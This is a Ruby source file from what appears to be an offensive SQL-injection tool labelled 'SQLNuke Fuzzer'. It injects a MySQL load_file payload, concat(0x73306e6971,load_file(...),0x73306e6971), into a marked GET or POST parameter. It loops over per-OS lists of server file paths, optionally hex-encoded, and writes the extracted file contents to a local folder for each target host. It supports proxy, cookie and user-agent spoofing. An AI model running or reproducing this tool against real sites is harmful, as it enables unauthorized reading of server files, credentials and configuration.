require './lib/output'
require 'yaml'
require 'pp'
require './lib/http'
require './lib/tools'
require 'uri'
require 'timeout'
class Methods


	
include Notification
include Tools

	def initialize 
		@config = YAML.load_file("config.yml")
		@logs = YAML.load_file("inputs/packset.lst")
		@http = HTTP.new()
		
	end

	def output(val)
		puts "Demo #{val}"
	end

	def url(val)
		@url = val
		self.linq_build()
	end

	def data(val)
		@postdata = val
	end

	def port(val)
		@config['port'] = val
		print_ok("Selected Port #{@config['port']}")
	end

	def os(val)
		#p val
		@os = val
	end

	def loops()
		@logs[].each do |key,value|
			puts value
		end
	end

	
	def hex(val)
		@hex = val
		if @hex
			print_ok('Hex Conversion Enabled')
		end
	end

	def proxy(val)
		c = val =~ /http:\/\//
		if c == nil
			print_error("Only HTTP proxies are alowed, Please use the http proxy as 'http://ip_address:port'")
			exit
		end
		if val
			print_ok("Proxy is set with the address #{val} ")
			@proxy = val
		else
			@proxy = nil
		end
	end

	def cookie(val)
		if val
			print_ok("Cookie is set for #{val}")
			@cookie = val
		else
			@cookie = ''
		end
	end

	def agent(val)
		if val
			print_ok("User Agent Set for #{val}")
			@agent = val
		else
			@agent ='SQLNuke Fuzzer 0.1'
		end
	end

	def referer(val)
		if val
			print_ok("Header Referer set for #{val}")
			@ref = val
		else
			@ref = ''
		end
	end

	def log_red(url)
		@ret = {}
		if @os
			print_note("Selected OS #{@os}")
			@logs[@os.to_sym].each do |value|
				file = value
				if @hex
					value = '0x'+t_hex(value)
				else
					value = "'#{value}'"
				end
				
				@ret[file] = url.sub(/#{@config['grabber']}/, value) 
			end

			return @ret
		else
			print_note('No OS selected, Continue with all the possibilities ')
			@logs.each do |key, value|
				
				value.each do |v|
					file = v
					
					if @hex
						v = '0x'+t_hex(v)
					else
						v = "'#{v}'"
					end
					
					@ret[file] = url.sub(/#{@config['grabber']}/, v) 
				end

			end
			return @ret
		end
	end
	
	def filer(key,res)
		com = res.body[/s0niq(.*)s0niq/m,1]
		#res.body[/s0niq(.*)s0niq/,1]
		if com 
			puts "[#{res.code}] - [Success] \t #{key}  "
			file = key.gsub(/\//, '_')
			File.open("output/#{@domain.host}/#{file}", 'w') {|f| f.write(com) }
			
		else
			puts "[#{res.code}] - [Failed] \t #{key} "
		end
		
	end
	def linq_build()
		@domain = @http.to_uri(@url)

		begin
			Dir.mkdir("output/#{@domain.host}")
		rescue Errno::EEXIST
			print_note("#{@domain.host} folder already exists" )
		end
		headers = {
		  'Cookie' => @cookie,
		  'Referer' => @ref,
		  'Content-Type' => 'application/x-www-form-urlencoded',
		  'User-Agent' => @agent
		}
		@http.header(headers)
		if @postdata

			post = @postdata =~ /#{@config['grabber']}/
			
			url = @url =~ /#{@config['grabber']}/
			
			if post != nil and url != nil
				print_error("Post values and Get values both can't have #{@config['grabber']} in it")
			elsif url or post
				if post
					selected = @postdata

				elsif url
					selected = @url
				end
				selected.sub!(/#{@config['grabber']}/ , "concat(0x73306e6971,load_file(#{@config['grabber']}),0x73306e6971)") 
				#parameters
				gen = self.log_red(selected)

				para = {:parameters => if post; selected;else ; @postdata ; end}

				gen.each do |key, req|
					para = {:parameters => req,:method=>:post}
						 
					res = @http.post(@url,para)
					self.filer(key,res)
				end
			elsif post == nil
				print_error('Nothing to Select , please check in ur url if you have mention XxxX where u need to fuzz')
			end
		else
			url = @url =~ /#{@config['grabber']}/
			#puts @url
			if url
				selected =@url
				selected.sub!(/#{@config['grabber']}/ , "concat(0x73306e6971,load_file(#{@config['grabber']}),0x73306e6971)") 
				gen = self.log_red(selected)
				gen.each do |key, req|
					#puts req
					if @proxy
						@http.proxy(@proxy) 
					end
					
					res = @http.get(req)
					self.filer(key,res)

				end

			else
				print_error('Nothing to Select , please check in ur url if you have mention XxxX where u need to fuzz')
			end
		end
		print("\n\n")
		print_ok("Saved files are in 'output/#{@domain.host}'")
		exit()
	end
end